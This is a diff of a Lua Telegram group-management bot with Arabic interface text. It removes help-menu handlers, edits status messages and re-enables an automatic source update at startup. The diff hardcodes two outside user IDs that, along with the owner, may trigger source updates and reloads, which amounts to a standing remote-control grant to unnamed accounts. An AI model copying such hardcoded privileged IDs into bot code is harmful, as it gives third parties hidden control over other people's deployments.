-⌯ كشف البوتات
-
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text="م3",callback_data="/HelpList3"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},
-{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
-{{text="رجوع",callback_data="/HelpList"..UserID}}
-} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end 
-
-if abbas == '/HelpList2'..UserID then
-
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[
-* للاستفسار -* []]..SUDO_USER..[[]
-
-
-*❨ اوامر الوضع ❩*
-
-⌯ وضع ترحيب
-⌯ وضع قوانين
-⌯ وضع وصف
-⌯ وضع رابط
-⌯ اضف امر
-⌯ تغيير رتبه
-
-*❨ اوامر رؤية الاعدادات ❩*
-
-⌯ المطورين
-⌯ المالكيين الاساسيين
-⌯ المالكيين 
-⌯ الادمنيه
-⌯ المدراء
-⌯ المميزين
-⌯ المحظورين
-⌯ القوانين
-⌯ قائمه المنع
-⌯ المكتومين
-⌯ المطور 
-⌯ معلوماتي 
-⌯ الحمايه  
-⌯ الوسائط
-⌯ الاعدادت
-⌯ المجموعه
-⌯ الساعه
-⌯ التاريخ
-
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text="م3",callback_data="/HelpList3"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},
-{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
-{{text="رجوع",callback_data="/HelpList"..UserID}}
-} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end 
-
-
-
-if abbas == '/HelpList3'..UserID then
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[
-* للاستفسار -* []]..SUDO_USER..[[]
-
-
-*❨ اوامر الردود ❩*
-
-⌯ الردود ↢ تشوف كل الردود المضافه
-⌯ اضف رد ↢ عشان تضيف رد
-⌯ مسح رد ↢ عشان تمسح الرد
-⌯ مسح الردود ↢ تمسح كل الردود
--
-⌯ الردود العشوائية ↢ تشوف كل الردود العشوائية المضافه
-⌯ اضف رد عشوائي ↢ عشان تضيف كلمة لها اكثر من رد
-⌯ مسح رد عشوائي ↢ عشان تمسح رد عشوائي
-⌯ مسح الردود العشوائية ↢ تمسح كل الردود العشوائية
-
-*❨ اوامر القفل والفتح بالمسح ❩*
-
-⌯ قفل ↣ ↢ فتح  التعديل  
-⌯ قفل ↣ ↢ فتح  البصمات 
-⌯ قفل ↣ ↢ فتح  الفيديو 
-⌯ قفل ↣ ↢ فتح  الـصــور 
-⌯ قفل ↣ ↢ فتح  الملصقات 
-⌯ قفل ↣ ↢ فتح  الملفات  
-⌯ قفل ↣ ↢ فتح  المتحركه 
-⌯ قفل ↣ ↢ فتح  الدردشه 
-⌯ قفل ↣ ↢ فتح  الروابط 
-⌯ قفل ↣ ↢ فتح  الهاشتاق 
-⌯ قفل ↣ ↢ فتح  البوتات 
-⌯ قفل ↣ ↢ فتح  المعرفات 
-⌯ قفل ↣ ↢ فتح  البوتات بالطرد 
-⌯ قفل ↣ ↢ فتح  الاشعارات 
-⌯ قفل ↣ ↢ فتح  الكلايش 
-⌯ قفل ↣ ↢ فتح  التكرار 
-⌯ قفل ↣ ↢ فتح  التوجيه 
-⌯ قفل ↣ ↢ فتح  الانلاين 
-⌯ قفل ↣ ↢ فتح  الجهات 
-⌯ قفل ↣ ↢ فتح  الــكـــل 
-⌯ قفل ↣ ↢ فتح  السب
-⌯ قفل ↣ ↢ فتح  الفارسيه
-⌯ قفل ↣ ↢ فتح  الانجليزيه
-⌯ قفل ↣ ↢ فتح  الاضافه
-⌯ قفل ↣ ↢ فتح  الصوت
-⌯ قفل ↣ ↢ فتح  الالعاب
-⌯ قفل ↣ ↢ فتح  الماركدوان
-⌯ قفل ↣ ↢ فتح  الويب
-
-*❨ اوامر الفتح والقفل بالتقييد ❩*
-
-⌯ قفل ↣ ↢ فتح التوجيه بالتقييد 
-⌯ قفل ↣ ↢ فتح الروابط بالتقييد 
-⌯ قفل ↣ ↢ فتح المتحركه بالتقييد 
-⌯ قفل ↣ ↢ فتح الصور بالتقييد 
-⌯ قفل ↣ ↢ فتح الفيديو بالتقييد 
-
-*❨ اوامر التفعيل والتعطيل ❩*
-
-⌯ تفعيل ↣ ↢ تعطيل الترحيب 
-⌯ تفعيل ↣ ↢ تعطيل الردود 
-⌯ تفعيل ↣ ↢ تعطيل التحذير 
-⌯ تفعيل ↣ ↢ تعطيل الايدي
-⌯ تفعيل ↣ ↢ تعطيل الرابط
-⌯ تفعيل ↣ ↢ تعطيل اطردني
-⌯ تفعيل ↣ ↢ تعطيل الحظر
-⌯ تفعيل ↣ ↢ تعطيل الحمايه
-⌯ تفعيل ↣ ↢ تعطيل المنشن
-⌯ تفعيل ↣ ↢ تعطيل الايدي بالصوره
-⌯ تفعيل ↣ ↢ تعطيل التحقق 
-⌯ تفعيل ↣ ↢ تعطيل ردود المطور 
-⌯ تفعيل ↣ ↢ تعطيل التنظيف التلقائي
-⌯ تفعيل ↣ ↢ تعطيل البايو 
-⌯ تفعيل ↣ ↢ تعطيل انطقي 
-⌯ تفعيل ↣ ↢ تعطيل الترجمة 
-⌯ تفعيل ↣ ↢ الردود العشوائيه 
-
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
-{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
-{{text="رجوع",callback_data="/HelpList"..UserID}}
-} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-if abbas == '/HelpListRrd'..UserID then
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[
-* للاستفسار -* []]..SUDO_USER..[[]
-
-*⦗ تفعيل التسليه ⦘*
-*⦗ تعطيل التسليه ⦘*
-
-🍰 ⌯ رفع ↣ ↢ تنزيل كيكه
-🍯 ⌯ رفع ↣ ↢ تنزيل عسل
-💩 ⌯ رفع ↣ ↢ تنزيل زق
-🦓 ⌯ رفع ↣ ↢ تنزيل حمار
-🐄 ⌯ رفع ↣ ↢ تنزيل بقره
-🐩 ⌯ رفع ↣ ↢ تنزيل كلب
-🐒 ⌯ رفع ↣ ↢ تنزيل قرد
-🐐 ⌯ رفع ↣ ↢ تنزيل تيس
-🐂 ⌯ رفع ↣ ↢ تنزيل ثور
-🏅 ⌯ رفع ↣ ↢ تنزيل باعوص
-🐓 ⌯ رفع ↣ ↢ تنزيل دجاجه
-🧱 ⌯ رفع ↣ ↢ تنزيل هطف
-🔫 ⌯ رفع ↣ ↢ تنزيل صياد
-🐏 ⌯ رفع ↣ ↢ تنزيل خاروف
-❤️ ⌯ رفع لقلبي ↣ ↢ تنزيل من قلبي
-👫 ⌯ زواج ↣ ↢ طلاق
-
-⌯ قائمة الكيك
-⌯ قائمة العسل
-⌯ قائمة الزق
-⌯ قائمة الحمير
-⌯ قائمة البقر
-⌯ قائمة الكلاب
-⌯ قائمة القرود
-⌯ قائمة التيس
-⌯ قائمة الثور
-⌯ قائمة البواعيص
-⌯ قائمة الدجاج
-⌯ قائمة الهطوف
-⌯ قائمة الصيادين
-⌯ قائمة الخرفان
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
-{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="م3",callback_data="/HelpList3"..UserID}},
-{{text="رجوع",callback_data="/HelpList"..UserID}}
-} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-if abbas == '/HelpListDev'..UserID then
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[
-* للاستفسار -* []]..SUDO_USER..[[]
-
-✶ اليـوتيوب
-- امر التشغيل ❨ تفعيل اليوتيوب ❩
-- امر التعطيل ❨ تعطيل اليوتيوب ❩
-
-✶ البـحث عن اغنية ↓
-↞ بحث اسم الاغنية
-
-
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
-{{text="التسليه",callback_data="/HelpListRrd"..UserID},{text="م3",callback_data="/HelpList3"..UserID}},
-{{text="رجوع",callback_data="/HelpList"..UserID}}
-} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-if abbas == '/HelpList'..UserID then
-SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[*• اهلا بك في اوامر البوت
-
-للاستفسار -* []]..SUDO_USER..[[]
-
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {{{text="م1",callback_data="/HelpList1"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},{{text="م3",callback_data="/HelpList3"..UserID}},{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}}} 
-return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-
-------------------------------{ End }------------------------
-
+UpdateNewQuery(data)
 elseif data.ID == "UpdateMessageSendSucceeded" then
 local msg = data.message_
 if msg.content_.text_ then
@@ -943,20 +602,20 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
-return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 60809019) then
+return sendMsg(msg.chat_id_,msg.id_,"- تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 60809019) then
 UpdateSource(msg)
-sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
+sendMsg(msg.chat_id_,msg.id_,'- {* تــم تحديث وتثبيت السورس  *} .\n\n- { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
-sendMsg(msg.chat_id_,msg.id_,'*تم*',function(arg,data)
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 60809019) then
+sendMsg(msg.chat_id_,msg.id_,'- {* تــم أعـاده تشغيل البوت  *} .\n\n- { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end)
@@ -974,7 +633,7 @@ if data.channel_.status_.ID == "ChatMemberStatusKicked" then
 if redis:get(boss..'group:add-100'..data.channel_.id_) then
 local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
 local NameGroup = (redis:get(boss..'group:name-100'..data.channel_.id_) or "")
-send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
+send_msg(SUDO_ID,"- قام شخص بطرد البوت من المجموعه الاتيه : \n- ألايدي : `-100"..data.channel_.id_.."`\n- الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n- تـم مسح كل بيانات المجموعه بنـجاح ")
 rem_data_group('-100'..data.channel_.id_)
 end
 end
@@ -1023,11 +682,11 @@ end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'*•* تم رفع النسخة‏‏ الاحتياطيه\n*•* حاليا عدد مجموعاتك هي‏‏ *'..redis:scard(boss..'group:ids')..'* 🌿\n✓')
+sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'-تم رفع النسـخة‏‏ الاحتياطـية\n- حاليا عدد مـجمـوعاتگ ة‏‏ية‏‏ *'..redis:scard(boss..'group:ids')..'* ✓')
 end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
-print("¦ userTypeDeleted")
+print("꒐ userTypeDeleted")
 redis:srem(boss..'users',data.user_.id_)
 elseif data.user_.type_.ID == "UserTypeGeneral" then
 local CheckUser = redis:hgetall(boss..'username:'..data.user_.id_).username
@@ -1037,7 +696,7 @@ else
 USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
 end	
 if CheckUser and CheckUser ~= USERNAME  then
-print("¦ Enter Update User ")
+print("꒐ Enter Update User ")
 redis:hset(boss..'username:'..data.user_.id_,'username',USERNAME)
 end 
 end
@@ -1049,7 +708,7 @@ msg.text = data.content_.text_
 input_inFo(msg)  
 end,nil)
 elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
---UpdateSource() dofile("./inc/Run.lua")
+UpdateSource() dofile("./inc/Run.lua")
 tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
 end
 
